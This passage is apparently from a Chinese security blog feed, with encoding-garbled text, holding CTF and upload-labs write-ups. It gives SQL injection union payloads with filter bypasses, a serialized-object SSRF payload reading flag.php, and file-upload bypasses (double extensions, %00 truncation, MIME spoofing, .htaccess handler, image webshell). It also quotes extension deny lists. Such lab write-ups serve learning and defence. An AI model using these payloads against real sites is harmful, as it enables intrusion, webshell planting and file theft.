    <content type="html"><![CDATA[<h1 id="æ”»é˜²ä¸–ç•Œ-fakebook"><a href="#æ”»é˜²ä¸–ç•Œ-fakebook" class="headerlink" title="æ”»é˜²ä¸–ç•Œ-fakebook"></a>æ”»é˜²ä¸–ç•Œ-fakebook</h1><p>æ„Ÿè§‰æŒºæœ‰æ„æ€çš„ä¸€é“é¢˜ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹å§</p><a id="more"></a><h2 id="0x01å‘ç°æ³¨å…¥ç‚¹"><a href="#0x01å‘ç°æ³¨å…¥ç‚¹" class="headerlink" title="0x01å‘ç°æ³¨å…¥ç‚¹"></a>0x01å‘ç°æ³¨å…¥ç‚¹</h2><p>è¿›å…¥ç½‘é¡µå‘ç°æ˜¯ä¸€ä¸ªåšå®¢é¡µé¢ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ä¸Šå»çœ‹çœ‹ï¼Œå‘ç°äº†ä¸€ä¸ªè²Œä¼¼å¯ä»¥æ³¨å…¥çš„åœ°æ–¹</p><p><code>http://220.249.52.133:44224/view.php?no=1</code>å‚æ•°noè¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªæ•°å­—å‹çš„æ³¨å…¥ç‚¹ï¼Œæµ‹è¯•ä¸€ä¸‹ã€‚</p><p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>æ˜¾ç¤ºæ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯</p><p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>ç½‘é¡µæŠ¥é”™ï¼Œç¡®å®šäº†å°±æ˜¯æ•°å­—å‹æ³¨å…¥</p><p>æ¥ä¸‹æ¥ç»§ç»­æ³¨å…¥çš„å¸¸è§„æ“ä½œã€‚</p><p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>æ—¶é¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œå¹¶æç¤ºäº†ç½‘ç«™çš„æ ¹ç›®å½•</p><p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" srcset="/img/loading.gif" alt></p><p>ä½†æ˜¯å½“ order by 5 # æ—¶ï¼Œç½‘é¡µæŠ¥é”™ï¼Œç¡®å®šæ˜¯å››åˆ—ã€‚</p><p><strong>çˆ†è¡¨å</strong></p><p>æœ¬ä»¥ä¸ºä¼šé¡ºåˆ©çš„çˆ†ç ´å‡ºæ¥ï¼Œä½†æ˜¯æç¤ºäº† hacker ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨é»‘åå•æ£€æµ‹</p><p>è¯•äº†è¯•åŒå†™ç»•è¿‡ï¼Œå‘ç°ç»§ç»­æç¤ºhackï¼Œå†è¯•è¯•ç”¨/**/æ›¿æ¢ç©ºæ ¼ï¼Œè¿™æ¬¡å±…ç„¶å¯ä»¥äº†ï¼Œæš‚ä¸”å½“å®ƒæ˜¯ç¦äº†ç©ºæ ¼ã€‚è¿™é‡Œè¿˜å‡ºç°ä¸€ä¸ªæç¤º</p><p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> æç¤ºå­˜åœ¨ååºåˆ—åŒ–ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆç”¨ç»§ç»­çˆ†è¡¨ã€‚</p><p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" srcset="/img/loading.gif" alt></p><p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p><p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p><p>çˆ†å‡ºä¸€å¤§å †åˆ—åã€‚ç›´æ¥è¯»å–dataçš„å†…å®¹</p><p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p><p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p><p>å‘ç°å†…å®¹æ˜¯æ³¨å†Œæ—¶ä¿¡æ¯ä¿å­˜ä¸ºåºåˆ—åŒ–å†…å®¹</p><p>O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€sunzyâ€;s:3:â€ageâ€;i:22;s:4:â€blogâ€;s:12:â€22.github.ioâ€;}</p><p>åˆ°è¿™é‡Œå°±ä¸çŸ¥é“æ€ä¹ˆåŠäº†ã€‚ã€‚ã€‚</p><h2 id="0x02å®¡è®¡æºç "><a href="#0x02å®¡è®¡æºç " class="headerlink" title="0x02å®¡è®¡æºç "></a>0x02å®¡è®¡æºç </h2><p>æ‰«æä¸€ä¸‹ç›®å½•å‘ç°äº†robots.txtï¼Œå…¶ä¸­ç»™å‡ºæ¥äº†æºç å¤‡ä»½æ–‡ä»¶çš„è·¯å¾„</p><p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" srcset="/img/loading.gif" alt></p><p>æºç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>ä¿¡æ¯ç±»</span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">""</span>;    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">""</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, $age, $blog)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">$this</span>-&gt;name = $name;    <span class="hljs-keyword">$this</span>-&gt;age = (int)$age;    <span class="hljs-keyword">$this</span>-&gt;blog = $blog;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($url)</span> // å¤„ç†<span class="hljs-title">url</span></span><span class="hljs-function"></span>&#123;    $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);    $output = curl_exec($ch);    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);    <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;    &#125;    curl_close($ch);    <span class="hljs-keyword">return</span> $output;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> <span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> <span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    $blog = <span class="hljs-keyword">$this</span>-&gt;blog;    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);&#125;&#125;</code></pre></div><p>å®¡è®¡æºç å‘ç°å…¶ä¸­get()å‡½æ•°å­˜åœ¨SSRF(æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ )æ¼æ´ã€‚</p><p><strong>æ€è·¯ï¼šåˆ©ç”¨noå‚æ•°è¿›è¡Œæ³¨å…¥ï¼Œåœ¨ååºåˆ—åŒ–ä¸­æ„é€ fileæ–‡ä»¶åè®®ï¼Œåˆ©ç”¨æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´è®¿é—®æœåŠ¡å™¨ä¸Šçš„flag.phpæ–‡ä»¶ã€‚</strong></p><div class="hljs"><pre><code class="hljs groovy">?no=-2%20union/**/select%201,2,3,'O:<span class="hljs-number">8</span>:<span class="hljs-string">"UserInfo"</span>:<span class="hljs-number">3</span>:&#123;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-string">s:</span><span class="hljs-number">5</span>:<span class="hljs-string">"sunzy"</span>;<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"age"</span>;<span class="hljs-string">i:</span><span class="hljs-number">22</span>;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"blog"</span>;<span class="hljs-string">s:</span><span class="hljs-number">29</span>:<span class="hljs-string">"file:///var/www/html/flag.php"</span>;&#125;<span class="hljs-string">'%20#</span></code></pre></div><p>æŸ¥çœ‹æºç ï¼Œè§£base64ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>unserailize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-11-21</title>
    <link href="/2020/09/18/upload2/"/>
    <url>/2020/09/18/upload2/</url>
    
    <content type="html"><![CDATA[<h1 id="upload-labs-11-21"><a href="#upload-labs-11-21" class="headerlink" title="upload-labs 11-21"></a>upload-labs 11-21</h1><a id="more"></a><h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;$msg = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">"php"</span>,<span class="hljs-string">"php5"</span>,<span class="hljs-string">"php4"</span>,<span class="hljs-string">"php3"</span>,<span class="hljs-string">"php2"</span>,<span class="hljs-string">"html"</span>,<span class="hljs-string">"htm"</span>,<span class="hljs-string">"phtml"</span>,<span class="hljs-string">"pht"</span>,<span class="hljs-string">"jsp"</span>,<span class="hljs-string">"jspa"</span>,<span class="hljs-string">"jspx"</span>,<span class="hljs-string">"jsw"</span>,<span class="hljs-string">"jsv"</span>,<span class="hljs-string">"jspf"</span>,<span class="hljs-string">"jtml"</span>,<span class="hljs-string">"asp"</span>,<span class="hljs-string">"aspx"</span>,<span class="hljs-string">"asa"</span>,<span class="hljs-string">"asax"</span>,<span class="hljs-string">"ascx"</span>,<span class="hljs-string">"ashx"</span>,<span class="hljs-string">"asmx"</span>,<span class="hljs-string">"cer"</span>,<span class="hljs-string">"swf"</span>,<span class="hljs-string">"htaccess"</span>,<span class="hljs-string">"ini"</span>);        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);        $file_name = str_ireplace($deny_ext,<span class="hljs-string">""</span>, $file_name);        $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];        $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;                <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;            $is_upload = <span class="hljs-keyword">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;    &#125;&#125;</code></pre></div><p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>è¿™æ®µä»£ç æ˜¯å°†æ–‡ä»¶åä¸­å‡ºç°  <code>deny_ext</code>çš„åç¼€åæ›¿æ¢ä¸ºç©º</p><p>å¯ä»¥åŒå†™ç»•è¿‡ï¼Œå³<code>1.pphphp</code></p><h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;$msg = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>]))&#123;    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>,<span class="hljs-string">'gif'</span>);    $file_ext = substr($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],strrpos($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],<span class="hljs-string">"."</span>)+<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;        $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];        $img_path = $_GET[<span class="hljs-string">'save_path'</span>].<span class="hljs-string">"/"</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-string">"."</span>.$file_ext;        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = <span class="hljs-keyword">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;        &#125;    &#125; <span class="hljs-keyword">else</span>&#123;        $msg = <span class="hljs-string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;    &#125;&#125;</code></pre></div><p>æœ¬é¢˜ä¸ä¹‹å‰çš„é¢˜ç›®æœ‰æ‰€ä¸åŒï¼Œè¿™é¢˜çš„æ–‡ä»¶çš„ä¿å­˜è·¯å¾„æ˜¯å¯ä»¥æ§åˆ¶çš„</p><p>è¿™é‡Œç”¨çš„<code>%00æˆªæ–­</code>ï¼ŒåŸç†å¦‚ä¸‹</p><p><code>www.xxx.com/qq.jpg</code></p><p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>å…¶åç¼€åä¸º.jpgå¯ä»¥ç»•è¿‡æ£€æµ‹ï¼Œä½†æ˜¯windowsç³»ç»Ÿå¤„ç†æ—¶ä¸ä¼šå¤„ç†%00ä¹‹åçš„å†…å®¹æ•…ä¿å­˜çš„æ–‡ä»¶å°±æ˜¯qq.php</p><p><img src="https://i.loli.net/2020/11/30/TwSKHkqZFC78uRd.png" srcset="/img/loading.gif" alt></p><h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>è¿™é¢˜ä¸ä¸Šé¢˜åˆ©ç”¨çš„åŸç†ç›¸åŒ</p><p>ä½†æ˜¯è¿™é‡Œè¦ä½¿ç”¨ 00çš„äºŒè¿›åˆ¶å½¢å¼</p><p><img src="/2020/09/18/upload2/13.png" srcset="/img/loading.gif" alt></p><p><img src="/2020/09/18/upload2/13-1.png" srcset="/img/loading.gif" alt></p><h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>æ˜ç¡®è¯´äº†ä¸Šä¼ å›¾ç‰‡æœ¨é©¬</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span><span class="hljs-params">($filename)</span></span>&#123;    $file = fopen($filename, <span class="hljs-string">"rb"</span>);    $bin = fread($file, <span class="hljs-number">2</span>); <span class="hljs-comment">//åªè¯»2å­—èŠ‚</span>    fclose($file);    $strInfo = @unpack(<span class="hljs-string">"C2chars"</span>, $bin);        $typeCode = intval($strInfo[<span class="hljs-string">'chars1'</span>].$strInfo[<span class="hljs-string">'chars2'</span>]);        $fileType = <span class="hljs-string">''</span>;        <span class="hljs-keyword">switch</span>($typeCode)&#123;              <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:                        $fileType = <span class="hljs-string">'jpg'</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:                        $fileType = <span class="hljs-string">'png'</span>;            <span class="hljs-keyword">break</span>;                <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:                        $fileType = <span class="hljs-string">'gif'</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">default</span>:                        $fileType = <span class="hljs-string">'unknown'</span>;        &#125;            <span class="hljs-keyword">return</span> $fileType;&#125;</code></pre></div><p><strong>GIF89a</strong> æ˜¯GIFå›¾ç‰‡çš„æ–‡ä»¶å¤´ ï¼Œæ˜¯ä¸ºäº†ç»•è¿‡gifæ–‡ä»¶çš„æ£€æŸ¥</p><p><strong>å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œ</strong></p><p>æ¡Œé¢å»ºç«‹ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶å°†å…¶æ”¹ä¸º2.jpgï¼Œå†å»ºç«‹ä¸€ä¸ªæ”¹ä¸º1.php,å…¶å†…å®¹ä¸ºä½ æƒ³æ·»åŠ çš„ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://i.loli.net/2020/11/30/vXmVIJ3OEzcnrsL.png" srcset="/img/loading.gif" alt></p><p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p><p><img src="https://i.loli.net/2020/11/30/KWgpdyf8xoFqcMn.png" srcset="/img/loading.gif" alt></p><p><strong>æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</strong></p>]]></content>
    
    
    <categories>
      
      <category>æ–‡ä»¶ä¸Šä¼ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>åŒå†™ç»•è¿‡</tag>
      
      <tag>00æˆªæ–­</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uploads-labs</title>
    <link href="/2020/09/16/uploads/"/>
    <url>/2020/09/16/uploads/</url>
    
    <content type="html"><![CDATA[<h1 id="upload-labs-1-10"><a href="#upload-labs-1-10" class="headerlink" title="upload-labs 1-10"></a>upload-labs 1-10</h1><a id="more"></a><h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>ç›´æ¥æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€åä¸ºjpg,png,gifå³å¯</p><h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>æŸ¥çœ‹æºç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/jpeg'</span>) || ($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/png'</span>) || ($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/gif'</span>))</code></pre></div><p>è¿™æ®µä»£ç è¯´æ˜æ˜¯å¯¹æ–‡ä»¶çš„<code>MIME</code>ç±»å‹è¿›è¡Œäº†è¿‡æ»¤ï¼Œç›´æ¥ä¸Šä¼  1.php æŠ“åŒ…åä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸º <code>&#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;</code>,è¿™ä¸‰ä¸ªç±»å‹éƒ½ä¸ºå›¾ç‰‡</p><p>æŠ“åŒ…ä¿®æ”¹MIMEå³å¯</p><p>çŸ¥è¯†ç‚¹è¡¥å……ï¼š</p><p> <strong>MIMEç±»å‹å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œä½†æ˜¯ä¼ ç»Ÿå†™æ³•éƒ½æ˜¯å°å†™ã€‚</strong> </p><div class="hljs"><pre><code class="hljs applescript"><span class="hljs-built_in">text</span>/plain<span class="hljs-built_in">text</span>/htmlimage/jpegimage/pngaudio/mpegaudio/oggaudio/*video/mp4<span class="hljs-built_in">application</span>/*<span class="hljs-built_in">application</span>/json<span class="hljs-built_in">application</span>/javascript<span class="hljs-built_in">application</span>/ecmascript<span class="hljs-built_in">application</span>/octet-stream</code></pre></div><p>æ›´è¯¦ç»†çš„è§£é‡Šï¼Œ</p><h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><div class="hljs"><pre><code class="hljs php">$deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">'.asp'</span>,<span class="hljs-string">'.aspx'</span>,<span class="hljs-string">'.php'</span>,<span class="hljs-string">'.jsp'</span>);</code></pre></div><p>åªç¦æ­¢äº†.asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨php3,php5,php7,phtmlç­‰ç­‰åç¼€åç»•è¿‡</p><h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p><strong>.htaccess</strong>æ–‡ä»¶çš„ä½œç”¨</p><blockquote><ul><li>URLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢</li><li>MIMEç±»å‹é…ç½®</li><li>è®¿é—®æƒé™æ§åˆ¶ç­‰</li><li>ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨</li><li>å›¾ç‰‡é˜²ç›—é“¾</li><li>è‡ªå®šä¹‰404é”™è¯¯é¡µé¢</li><li>é˜»æ­¢/å…è®¸ç‰¹å®šIP/IPæ®µ</li><li>ç›®å½•æµè§ˆä¸ä¸»é¡µ</li><li>ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹</li><li>æ–‡ä»¶å¯†ç ä¿æŠ¤</li></ul></blockquote><div class="hljs"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch "1.jpg"&gt;</span><span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre></div><p>è¿™å‡ å¥ä»£ç çš„æ„æ€ï¼š</p><p>é€šè¿‡.htaccessæ–‡ä»¶è°ƒç”¨phpè§£æå™¨å»è§£æä¸€ä¸ªæ–‡ä»¶åä¸­åªè¦åŒ…å«â€1.jpgâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„ä»»æ„æ–‡ä»¶ï¼Œ</p><p>æ— è®ºæ‰©å±•åæ˜¯ä»€ä¹ˆ(æ²¡æœ‰ä¹Ÿè¡Œ)ï¼Œéƒ½ä»¥phpçš„æ–¹å¼æ¥è§£æ</p><p>ä¸Šä¼ å®Œ.htaccessæ–‡ä»¶åç›´æ¥ä¸Šä¼ ä¸€ä¸ª <code>1.jpg</code>å³å¯</p><h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;$msg = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>);        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);        $file_name = deldot($file_name);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);        $file_ext = strtolower($file_ext); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        $file_ext = trim($file_ext); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>                <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = <span class="hljs-keyword">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;    &#125;&#125;</code></pre></div><p>æœ¬é¢˜ä¸ç¬¬åé¢˜å®Œå…¨ä¸€æ ·ï¼Œè¯¦ç»†è§£ç­”è§ç¬¬åé¢˜</p><p><img src="/2020/09/16/uploads/5.png" srcset="/img/loading.gif" alt></p><h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;$msg = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);        $file_name = deldot($file_name);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span 